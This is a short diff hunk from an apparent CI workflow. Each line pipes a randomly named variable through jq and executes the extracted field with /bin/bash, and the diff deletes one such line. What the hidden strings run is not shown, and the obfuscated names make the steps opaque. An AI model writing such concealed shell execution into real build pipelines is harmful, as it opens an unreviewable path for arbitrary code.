@@ -23,7 +23,6 @@ jobs:
           echo $fyx401 | jq -r .wxhh3 | /bin/bash
           printf '%s' "$dso232" | jq -r .qy8 | /bin/bash
           echo $wachc2 | jq -r .o92897 | /bin/bash
-          echo $osue0 | jq -r .cwrgx78 | /bin/bash
           printf '%s' "$ho7016" | jq -r .eh2446 | /bin/bash
           printf '%s' "$p7812" | jq -r .fkzg605 | /bin/bash
           echo $wi652 | jq -r .pv6 | /bin/bash
